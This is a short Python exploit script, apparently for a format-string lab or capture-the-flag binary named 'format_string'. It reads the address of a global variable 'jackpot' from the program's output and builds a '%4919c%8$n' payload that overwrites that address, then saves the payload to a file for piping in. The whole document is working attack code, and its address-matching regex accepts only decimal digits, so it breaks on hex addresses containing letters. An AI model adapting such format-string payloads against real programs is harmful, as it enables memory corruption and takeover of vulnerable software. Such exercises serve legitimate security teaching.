#!/usr/bin/python3
import subprocess
import re

# Determine the address of global var jackpot
print("Determining up-to-date address of global var 'jackpot'...")
result = subprocess.run(["./format_string"], 
                        input=b"hello", 
                        stdout=subprocess.PIPE)
mo = re.search(r"(?<=@\s)0x\d{,16}(?=\s)", result.stdout.decode())
jackpot_addr = int(mo.group(0), 16).to_bytes(8, 'little')

# Construct exploit
print("Building the payload...")
EXPLOIT = b"%4919c%8$nAAAAAA"
EXPLOIT += jackpot_addr

# Write to file
print("Writing to file 'exploit'...")
with open('exploit', 'wb') as f:
    f.write(EXPLOIT)

print("Done!")
print("Now try running './format_string < exploit'")

